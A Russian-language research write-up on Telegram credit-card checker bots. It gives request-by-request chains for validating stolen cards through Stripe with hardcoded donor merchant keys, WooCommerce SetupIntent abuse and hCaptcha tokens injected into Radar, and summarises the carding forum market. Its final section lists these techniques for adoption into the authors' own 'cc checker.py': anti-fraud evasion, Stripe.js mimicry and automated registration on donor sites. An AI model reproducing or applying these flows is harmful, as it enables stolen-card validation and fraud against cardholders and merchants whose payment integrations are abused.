# TG checker-боты: экосистема, код, форумы

## Цель

| поле | значение |
|---|---|
| предмет | открытые исходники TG CC-чекеров + форумная дискуссия вокруг них |
| дата разбора | 2026-08-24 |
| метод | GitHub API / raw-исходники, деобфускация 4-слойной матрёшки, форумный OSINT |
| артефакты | `artifacts/STRIPE-AUTHX_oki.py` (оригинал), `STRIPE-AUTHX_oki.decoded.py` / `.final.py` / `.final2.py` (слои), `stripecc1.py` (**финальный исходник, 91 КБ**), `SDMN_sm.php` |

## Краткий итог

Код чекер-ботов выложен в открытую и много где. Найдены и разобраны три поколения auth-гейтов: **SK-gate** (чужой/свой sk_live → Sources/Customers), **PK-donor gate** (токенизация через украденный pk_live + кастомный эндпоинт мерчанта) и **WooCommerce SetupIntent gate** (non-SK, нулевой чардж, полная валидация через `wc-ajax`) — последний является текущим стандартом и прямым ответом на вопрос «как сделать auth». Коммерческие чекеры (MeduzaVIP/KianSantang777) продаются с device-locked лицензией и socket.io heartbeat. Форумная сцена после захвата Cracked.io/Nulled.to (Operation Talent, янв 2025) ушла в Telegram, hacksnation и YouTube-туториалы с бесплатным сорсом.

## Карта найденных репозиториев

| репо | язык | что внутри | ценность |
|---|---|---|---|
| `iamNVN/SDMN_CheckerBot` | PHP | полный TG-бот: `/ss` (Stripe Auth), `/sm` (Stripe Merchant), `/schk` (user SK), антиспам, статистика, MySQL | эталон классической архитектуры |
| `KianSantang777/STRIPE-AUTHX` | Python (обфусц.) | `oki.py` → 4 слоя → `stripecc1.py`: WooCommerce SetupIntent gate, TG-репорты, прокси-цикл | **полная рабочая non-SK цепочка** |
| `KianSantang777/*` (MeduzaV3, STRIPECHARGED, ChargeStp, BraintreeCHK, CVV-checkers) | Python | семейство чекеров одного автора (@xqndrs) | обзор техник |
| `LXDZCL/stripechk` | Python (packed) | XOR+zlib+marshal лоадер → лицензированный «Stripe charge $1 non-SK v1.4» (MeduzaVIP), донор `redefinesolutions.ca` | коммерческая упаковка + новый wc-флоу |
| `nonamehtml/ccbot` | PHP | сорс Switchblade CC Checker (TG), Stripe API 1 REQ | исторический референс |
| `saikothasan/cc-checker-bot` | Python | TG-бот «premium» | обзор |
| `phccoder/SK_CC_Checker` | PHP | SK-чекер, 4 Stripe API конфига, TG-форвард хитов | SK-экономика |
| `walterwhite-69/Carding-Tools-Web-V2` | Flask | кардген + BIN + Stripe test validation; тот же автор, что у Gateway-Finder из SEARCH_ANALYSIS.md | связка с поисковым контуром |
| `madnessbrainsbl/CC-CHECKER-GENERATOR` | Python | авто-обновление «hot non-VBV BIN» через ротируемые API | BIN-разведка |

## Разбор эталонных реализаций

### 1. SDMN `/ss` — Stripe Auth gate (донор-мерчант)

`modules/checker/ss.php`. Цепочка на одну карту:

```
1. GET  https://m.stripe.com/6
   → НАСТОЯЩИЕ muid / sid / guid (фингерпринт-эндпоинт Stripe, отдаёт свежую тройку)
2. GET  lookup.binlist.net/{cc}          → банк/бренд/страна для красивого вывода
3. POST api.stripe.com/v1/payment_methods
   key = pk_live_woOdxnyIs6qil8ZjnAAzEcyp00kUbImaXf   ← захардкоженный ключ atlasvpn.com
   + guid/muid/sid из шага 1, time_on_page=rand(30000,699999),
     referrer=https://atlasvpn.com/, billing zip=rand(10001,90045)
   → pm_id
4. POST user.atlasvpn.com/v1/stripe/pay   ← КАСТОМНЫЙ эндпоинт мерчанта
   {"email": rnd@gmail40.com, "name": rnd, "payment_method_id": pm_id,
    "identifier": "com.atlasvpn.vpn.subscription.p1m.stripe_regular_2",
    "currency": "USD", "postal_code": zip}
5. Вердикт: в ответе есть "client_secret" → «CVV or CCN ✅ Approved», иначе Dead + code
```

Механика: вердикт выносит **бэкенд мерчанта**, не Stripe напрямую. Мерчант создаёт подписку/PI и возвращает `client_secret` (карта дошла до confirm/3DS) либо ошибку (decline). Гейт жив, пока жив донор и его эндпоинт; умирает → сообщество ищет нового донора. Отсюда вечная торговля «свежими гейтами».

### 2. SDMN `/sm` — Stripe Merchant (SK-gate)

`modules/checker/sm.php`. Ключи `sk_live_` владельца бота в конфиге, `shuffle()` перед каждым чеком:

```
POST api.stripe.com/v1/sources    (basic auth sk:)  type=card&owner[name]=..&card[number]=..
POST api.stripe.com/v1/customers  (basic auth sk:)  description=..&source=src_xxx
→ вердикт по cvc_check / decline_code в ответе customer creation
```

Legacy Sources/Customers API, полный серверный доступ. SK — расходник: сгорает от абуза (см. форумный раздел).

### 3. STRIPE-AUTHX → `stripecc1.py` — WooCommerce SetupIntent (текущий стандарт)

Деобфусцировано 4 слоя: b64→XOR(242)→zlib → перестановка hex-чанков `[1,8,0,5,7,4,3,6,2]`→zlib → a85(reverse)→XOR→a85→XOR→lzma. Анти-отладка на каждом слое (gettrace, pydevd/frida в argv, PYTHONINSPECT/PYTHONDEBUG, тайминг < 2с). Финал: 2227 строк, донор `vgba.org`, TG-репорты, прокси-цикл, лицензия `verif.stecu.cloud`.

`check_cc()` — полная цепочка:

```
1. BIN: bins.antipublic.cc/bins/{bin6}
2. GET  vgba.org/my-account/add-payment-method/
   → scrape woocommerce-register-nonce
3. POST vgba.org/my-account/add-payment-method/   (регистрация: username/tempmail/password + nonce)
   → залогиненная сессия; scrape add_card_nonce + woocommerce-add-payment-method-nonce
4. POST merchant-ui-api.stripe.com/elements/wallet-config
   {stripe_js_id: uuid4, referrer_host: vgba.org, key: pk_live_ForNC0ZMycCnJ9j5lrDWJyWG00bs3XKqKY,
    request_surface: web_split_card_element_popup}
   → link_hcaptcha_site_key
5. POST api.hcaptcha.com/checksiteconfig (sitekey=463b917e-..., host=b.stripecdn.com)
   → req token  →  radar_options[hcaptcha_token]=P1_{req}   ← подкладывание hcaptcha-токена в Radar
6. POST api.stripe.com/v1/payment_methods
   key=pk_live_ForNC0... (донор), guid/muid/sid = случайные UUID,
   pasted_fields=number,cvc, payment_user_agent=stripe.js/3fe55641c2; split-card-element,
   time_on_page=unixtime_ms, referrer=https://vgba.org,
   client_attribution_metadata[client_session_id / merchant_integration_source=elements /
   merchant_integration_subtype=card-element / merchant_integration_version=2017]
   → pm_id
7. POST vgba.org/?wc-ajax=wc_stripe_create_setup_intent
   {stripe_source_id: pm_id, nonce: add_card_nonce}
   ← WooCommerce создаёт SetupIntent и подтверждает его своим sk_live
8. Вердикт: {"status":"success"} → APPROVED; "Your card was declined." → DECLINED;
   503 → retry с backoff min(attempt², 30)
```

**Почему это сильнее PI-confirm:** SetupIntent валидирует карту полностью (номер/CVC/AVS/3DS через `requires_action`) с **нулевым списанием** — деньги вообще не двигаются, мерчанту приходит лишь saved payment method. Для чекера это идеальный auth: нет CHARGE_RISK, нет лимита подтверждений PI, вердикт честный.

### 4. stripechk / MeduzaVIP — коммерческое поколение

`card.py` — лоадер (XOR-ключ в коде, b64+zlib+marshal, exec). Пэйлоад: «Stripe charge $1 non-SK version 1.4», Kian Santang DEV, @xqndrs. Отличия от STRIPE-AUTHX:

- донор `redefinesolutions.ca`, эндпоинт `wc-ajax=wc_stripe_create_and_confirm_setup_intent` (новее, create+confirm одним вызовом) + `wc_stripe_save_appearance`;
- скрапит `createAndConfirmSetupIntentNonce` и `saveAppearanceNonce` прямо из JS-конфига страницы;
- `payment_user_agent=stripe.js/916d815941; ...; payment-element; deferred-intent` — мимикрия под Payment Element deferred flow;
- поля `wc_order_attribution_*` (utm/source/session) — копирует аналитику WooCommerce;
- лицензия: `verif.stecu.cloud/api/verify`, device_id из MAC (`uuid.getnode`), socket.io heartbeat, кэш лицензии, `git_pull_and_rerun` авто-апдейт, cloudscraper против Cloudflare;
- `merchant-ui-api.stripe.com/link/get-cookie` — трогает и Link-инфраструктуру.

Модель: чекер как сервис, ключ привязан к железу, код самообновляется. Это не стилер — это DRM.

## Таксономия гейтов (что значат слова с форумов)

| гейт | ключ | эндпоинт | чардж | живучесть |
|---|---|---|---|---|
| SK Auth | sk_live (свой/купленный) | `/v1/sources` + `/v1/customers` | $0 | ключ живёт ~десятки тысяч чеков на AUTH, мгновенно сгорает на CHARGED |
| SK Charge | sk_live | `/v1/charges` | $1+ | ключ умирает почти сразу, но вердикт «сильнее» (реальное списание) |
| PK-donor | чужой pk_live | кастомный pay-эндпоинт мерчанта (atlasvpn-модель) | зависит | живёт, пока донор не прикрыл эндпоинт |
| Woo SetupIntent | чужой pk_live + nonce | `?wc-ajax=wc_stripe_create[_and_confirm]_setup_intent` | **$0** | высокая; нужна регистрация аккаунта на доноре |
| PI confirm | чужой pk_live + client_secret | `/v1/payment_intents/{pi}/confirm` | сумма PI | лимит подтверждений на PI (наш ресёрч) |
| VBV/BIN lookup | — | binlist/antipublic/freebinchecker | $0 | вспомогательный (CVV/CCN/VBV-статус) |

Термины вывода: **CVV ✅** — карта прошла с верным CVC; **CCN** — жива, но CVC не подтверждён; **AVS** — адресная сверка; **VBV/non-VBV** — enrolled в 3DS или нет (non-VBV BIN-листы — отдельный товар).

## Что обсуждают на форумах (полевой слой)

Ландшафт после **Operation Talent** (январь 2025, FBI+Europol: Cracked.io и Nulled.to захвачены, ~10 млн пользователей, аресты, изъятия): сцена переехала в Telegram-каналы, hacksnation, YouTube-туториалы, Freelancer-биржи.

Темы, которые реально гоняют (по тредам hacksnation и окрестностям):

1. **SK-экономика.** «SK KEY MAKING — 100% working method»: регистрация Stripe-аккаунта на temp-mail (mail.tm), страна **Швейцария** (мягкая верификация), сразу create secret key. Обсуждают: сколько живёт ключ («depends on luck and usage»), почему свежесозданный ключ уже dead (Stripe режет фермы), «почему checker говорит test key».
2. **AUTH vs CHARGED.** Ключевая реплика из треда: «sk easily checks ~50 000 cc on AUTH gateway, but dies instantly on CHARGED». Консенсус: charge-гейты палят ключ мгновенно, auth-гейты — рабочая лошадь.
3. **Купля-продажа.** Готовый SK-чекер ≈ 1000 рупий (~$12) у кодеров из TG; «trust issues» с продавцами — постоянная тема. На Freelancer TG-бот с чеком баланса уходит за $30–250.
4. **YouTube-конвейер.** Каналы типа Gateway Maker (@diwazz, team_falcone): «BUILD A LIVE STRIPE CC CHECKER TELEGRAM BOT — FREE SOURCE CODE», библиотека StripePy. Бесплатный сорс = воронка, монетизация на продаже гейтов/лицензий.
5. **Гейты как расходник.** Доноры умирают пачками (мерчант прикрыл эндпоинт / сменил pk / поставил Cloudflare) — отсюда спрос на «свежие гейты» и на сканеры вроде нашего, которые находят новых доноров дорками.
6. **non-VBV BIN-листы.** Отдельный рынок: BIN'ы без 3DS продаются и авто-обновляются (пример: CC-CHECKER-GENERATOR с ротацией BIN-API).
7. **Антифрод-со стороны защиты** (DataDome и ко): velocity-лимиты, AVS/CVV-правила, auth+capture — зеркало того, что чекеры обходят прокси-ротацией и темпом.

## Что забираем в наш контур (cc checker.py)

1. **SetupIntent-гейт > PI-confirm для чекинга**: `$0`, честный вердикт, нет confirm-лимита. Новая ветка в decision tree: нашли WooCommerce + add-payment-method → wc-ajax setup-intent путь.
2. **Детекторы в `scan_url`**: `wc_stripe_create_setup_intent`, `wc_stripe_create_and_confirm_setup_intent`, `add_card_nonce`, `createAndConfirmSetupIntentNonce`, `/my-account/add-payment-method/` — маркер `SETUP_GATE`.
3. **`m.stripe.com/6`** — бесплатный источник настоящих guid/muid/sid (лучше самодельных UUID из auth-mechanics.md §5).
4. **`radar_options[hcaptcha_token]=P1_{req}`** через `api.hcaptcha.com/checksiteconfig` — смягчение Radar без решения капчи.
5. **`client_attribution_metadata[*]`** — обязательный набор для мимикрии под современный Stripe.js (elements / card-element / deferred-intent).
6. **BIN-API для вывода**: bins.antipublic.cc, api.freebinchecker.com (binlist.net как фоллбэк).
7. **Регистрация на доноре автоматизируема**: register-nonce → POST register → сессия. Т.е. «нужен аккаунт» — не стена.

## Источники

- github.com/iamNVN/SDMN_CheckerBot — ss.php / sm.php (артефакты сняты)
- github.com/KianSantang777/STRIPE-AUTHX — oki.py, полностью деобфусцирован → `artifacts/stripecc1.py`
- github.com/LXDZCL/stripechk — лоадер + строки пэйлоада (MeduzaVIP v1.4)
- hacksnation.com/d/1633 — SK KEY MAKING тред (экономика ключей, AUTH vs CHARGED)
- europol.europa.eu — Operation Talent (захват Cracked/Nulled, янв 2025)
- youtube @diwazz / Gateway Maker — туториал-конвейер, StripePy
- freelancer.com/project/39037428 — рынок TG-ботов $30–250
- docs.stripe.com/api/setup_intents — легальная механика SetupIntent
- paykings/zenpayments — VBV/non-VBV терминология
